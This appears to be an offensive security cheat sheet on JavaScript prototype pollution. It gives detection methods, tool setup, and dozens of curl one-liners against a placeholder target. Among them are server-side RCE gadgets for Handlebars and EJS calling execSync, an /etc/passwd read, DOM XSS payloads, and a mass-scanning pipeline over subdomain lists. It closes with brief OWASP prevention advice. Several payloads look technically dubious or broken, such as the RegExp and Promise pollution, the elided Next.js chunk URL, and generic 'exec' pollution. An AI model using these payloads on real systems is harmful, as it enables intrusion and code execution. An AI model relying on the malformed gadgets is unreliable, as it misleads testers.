# Prototype Pollution

> Comprehensive methodology and one‑liner commands for detecting and exploiting JavaScript prototype pollution vulnerabilities, incorporating 2025–2026 trends (server‑side RCE via polluted child_process/fs/templates, client‑side DOM XSS, gadget rediscovery in lodash/express/fastify/handlebars/ejs/next.js, polyglot payloads, polluted options in SSR/SSG frameworks, chained with SSTI/XSS) and authoritative references (PortSwigger Web Security Academy, OWASP Prototype Pollution Prevention Cheat Sheet, Snyk Research, PayloadsAllTheThings).

Prototype Pollution occurs when user‑controlled data is recursively merged into JavaScript objects without safeguards, polluting `Object.prototype` (or other prototypes) → affecting all objects globally and leading to XSS, logic bypass, DoS, or RCE.

## Methodology

### Targets & Sources to Hunt

**Sources:** JSON payloads, query parameters, URL fragments merged into objects via $.extend, Object.assign, _.merge.

**Common vulnerable locations:**
- JSON POST bodies (`{"user": {...}}`)
- Query params parsed as objects (`?config[key]=value` → deep merge)
- URL fragments / hash params in SPAs
- Form data / multipart fields
- WebSocket / SSE messages
- Config / options objects in API requests

**Common vulnerable functions / libraries (fuzz for these in JS):**
- `Object.assign(target, source)`
- `_.merge`, `_.extend`, `$.extend` (deep merge)
- `fast‑json‑patch`, `deepmerge`, `merge‑options`
- Custom recursive merge functions
- Express/Fastify middleware parsing JSON → polluting req.body / app.locals

**Where to find:**
- Network tab: JSON requests with nested objects
- JS files: grep for `merge`, `extend`, `assign`, `Object.prototype`, `__proto__`
- Error messages leaking polluted objects

### Basic Probes (Start Here)

Inject simple pollution payloads and check impact:

**Common test payloads:**
```json
{"__proto__": {"polluted": true}}
{"__proto__": {"toString": "polluted"}}
{"constructor": {"prototype": {"polluted": true}}}
```

- Send via JSON body, query param (`?__proto__[polluted]=true`), or fragment
- Check response / behavior:
  - `({}).polluted === true` → polluted!
  - `({}).toString()` returns "polluted"
  - `JSON.stringify({})` includes polluted props (some libs)

Look for: Global object pollution, unexpected properties on plain objects, errors like "polluted is not a function".

### Techniques by Impact / Sink

- **Client‑side (XSS / logic bypass)**
  - Pollute `String.prototype`, `Array.prototype` → break rendering / event handlers
  - Pollute DOM‑related prototypes → XSS via innerHTML / eval sinks
  - Test: Pollute `console.log` or `alert` → observe execution
- **Server‑side (RCE / DoS / bypass)**
  - Pollute `child_process`, `fs`, `require` → RCE in templates / exec
  - Pollute template engines: `handlebars`, `ejs`, `pug` options → SSTI/RCE
  - Pollute Express/Fastify: `app.locals`, `res.locals` → persistent pollution
  - Pollute logger / config → DoS via infinite recursion
- **Gadget chains (2025–2026 hot)**
  - `{"__proto__": {"exec": "id"}}` → if polluted child_process.exec
  - `{"__proto__": {"compile": "return process.mainModule.require('child_process').execSync('id')"}}` → Handlebars/EJS
  - Pollute `options` in Next.js / SSR → arbitrary code in render

## Tool Installation & Setup

### Burp Suite JavaScript Prototype Pollution Scanner Extension
- Install via Burp's BApp Store: **JavaScript Prototype Pollution Scanner**
- Automatically detects merge sinks and tests pollution payloads

### PP Finder / prototype‑pollution‑finder (CLI)
```bash
# Clone and install
git clone https://github.com/dwisiswant0/prototype-pollution-finder.git
cd prototype-pollution-finder
pip3 install -r requirements.txt
python3 pp-finder.py -h
```

### PPFuzz (Node.js fuzzer)
```bash
npm install -g ppfuzz
# or
git clone https://github.com/dwisiswant0/ppfuzz.git
cd ppfuzz
npm install
```

### pollute.js (manual testing utilities)
```bash
git clone https://github.com/BlackFan/client-side-prototype-pollution.git
cd client-side-prototype-pollution
# Includes pollute.js and other utilities
```

### Other Utilities
- **curl** – manual JSON/query parameter injection
- **jq** – JSON processing and payload generation
- **grep** – search JS files for vulnerable patterns (`merge`, `extend`, `assign`, `__proto__`)
- **Burp Repeater + Intruder** – fuzz `__proto__`/`constructor` payloads

## Testing Commands (One‑Liners)

### Basic Source Detection in JavaScript Files
```bash
# Grep for vulnerable merge/extend/assign patterns in collected JS files
cat livejslinks.txt | xargs -I@ curl -s @ | grep -E "(merge|extend|assign|__proto__|constructor\.prototype)" | anew proto-pollution.txt
```

### Parameter Pollution Check via Page‑Fetch
```bash
# Test URL parameters for prototype pollution using page‑fetch (headless browser)
cat https-subs.txt | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit/' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

### JSON‑Based Pollution (POST Requests)
```bash
# Send JSON payload with __proto__ pollution
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"__proto__": {"polluted": true}}'
# Verify pollution: check if ({}).polluted === true
```

### Query Parameter Pollution (GET Requests)
```bash
# Inject via query parameter (URL‑encoded)
curl -X GET "https://target.com/api/config?__proto__[polluted]=true"
# Alternative format
curl -X GET "https://target.com/api/config?__proto__.polluted=true"
```

### Constructor.prototype Alternative
```bash
# Use constructor.prototype bypass for libraries that filter __proto__
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"constructor": {"prototype": {"polluted": true}}}'
```

### Deep / Nested Pollution
```bash
# Nested pollution inside object structures
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"a": {"b": {"__proto__": {"polluted": true}}}}'
```

### Client‑Side Verification (Browser Console)
```bash
# After sending pollution payload, verify in browser console
echo 'console.log(({}).polluted);'  # Should output true if polluted
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

### Polyglot / Filter Bypass Payloads
```bash
# URL‑encoded __proto__
curl -X GET "https://target.com/api/config?%5f%5fproto%5f%5f[polluted]=true"
# Alias 'proto' (some libraries)
curl -X POST https://target.com/api/merge -d '{"proto": {"polluted": true}}'
# Bracket notation bypass
curl -X POST https://target.com/api/merge -d '{"__proto__[polluted]": true}'
```

### Constructor.prototype Abuse

Payloads using `constructor.prototype` bypass libraries that filter `__proto__`:

```bash
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"constructor": {"prototype": {"polluted": true}}}'
```

### Deep / Nested Pollution

Pollution inside nested object structures to bypass shallow checks:

```bash
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"a": {"b": {"__proto__": {"polluted": true}}}}'
```

### Server‑Side RCE Gadgets (Node.js)
```bash
# Pollute child_process.exec for RCE (if gadget exists)
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"__proto__": {"exec": "id"}}'
# Pollute fs.readFile for file read
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"__proto__": {"readFile": "/etc/passwd"}}'
```

### Template Engine Pollution (Handlebars, EJS, Pug)
```bash
# Handlebars RCE via polluted compile
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"__proto__": {"compile": "return process.mainModule.require(\"child_process\").execSync(\"id\")"}}'
# EJS options pollution
curl -X POST https://target.com/api/merge -H "Content-Type: application/json" -d '{"__proto__": {"options": {"client": true, "escapeFunction": "console.log(process.mainModule.require(\"child_process\").execSync(\"id\"))"}}}'
```

### Client‑Side DOM XSS Gadgets
```bash
# Pollute String.prototype to trigger XSS via innerHTML
curl -X GET "https://target.com/page?__proto__[innerHTML]=<img src=x onerror=alert(1)>"
# Pollute console.log to execute arbitrary code
curl -X GET "https://target.com/page?__proto__[log]=alert(1)"
```

### RegExp.prototype & Promise.prototype Abuse
```bash
# RegExp.prototype pollution for DoS (catastrophic backtracking)
curl -X POST https://target.com/api/merge -d '{"__proto__": {"RegExp": {"prototype": {"exec": "malicious"}}}}'
# Promise.prototype pollution for async logic bypass
curl -X POST https://target.com/api/merge -d '{"__proto__": {"Promise": {"prototype": {"then": "bypassed"}}}}'
```

### Next.js / SSR Framework Pollution
```bash
# Pollute Next.js options for server‑side rendering RCE
curl -X POST https://target.com/_next/static/chunks/... -d '{"__proto__": {"getServerSideProps": "malicious"}}'
```

### Wordlists & Payload Collections

- **PayloadsAllTheThings** – [Prototype Pollution payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution) – comprehensive collection of polyglot payloads, gadget chains, and bypasses
- **Snyk prototype‑pollution‑payloads** – curated payloads for Node.js libraries and template engines
- **BlackFan/client‑side‑prototype‑pollution** – utilities and payloads for client‑side pollution
- **Intigriti/HackerOne bug reports (2025–2026)** – recent gadget rediscoveries in lodash, express, fastify, Next.js

### Extra / Advanced Checks

- **Chained pollution → SSTI → RCE** – Pollute template context, then trigger SSTI for remote code execution
- **Chained pollution → XSS via polluted String.prototype** – Pollute `String.prototype` then trigger XSS via innerHTML/eval sinks
- **Persistent pollution** – Affects all requests after first (server‑side) → long‑lived impact
- **Library‑specific gadgets** – lodash.merge <4.17.21, express <4.18.3 patches – test older versions
- **Multi‑tenant / shared state impact** – Pollution affecting other users in shared environments (SaaS)

## Detection & Verification

**Indicators of vulnerability:**
- `({}).polluted === true` or custom property appears on empty objects
- Unexpected DOM behavior, XSS popup (client‑side)
- RCE output (`id`, `whoami`), file read, DoS (crash/loop)
- Blind: Time delays, OOB callbacks, observable side‑effects

**Verification steps:**
1. Identify merge sinks: grep for `merge`, `extend`, `assign` in JS files
2. Test with basic `__proto__` and `constructor.prototype` payloads
3. Verify pollution via browser console or server response reflection
4. Chain with gadgets (XSS, RCE, DoS) to prove impact

## Prevention Guidance (OWASP Latest)

1. **Avoid recursive merge from untrusted input** – best defense
2. **Use safe alternatives** – `structuredClone` (deep copy), shallow assign
3. **Freeze / seal prototypes** – `Object.freeze(Object.prototype)`
4. **Null‑prototype objects** – `Object.create(null)` for user data
5. **Input validation** – strip / reject `__proto__`, `constructor`, `prototype`
6. **Library updates** – lodash.merge ≥4.17.21, fastify ≥4.26.2
7. **Sandbox** – vm2 / isolated‑vm for untrusted code
8. **Node.js flag** – `--disable‑proto=delete` to remove `__proto__` property

## References

- **PortSwigger Web Security Academy** – [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- **OWASP Cheat Sheet Series** – [Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- **PayloadsAllTheThings** – [Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)
- **Snyk Research** – Prototype Pollution in Node.js (2025–2026 updates)
- **Recent Bounties (2025–2026)** – Next.js pollution → RCE, lodash gadget rediscovery (Intigriti/HackerOne)
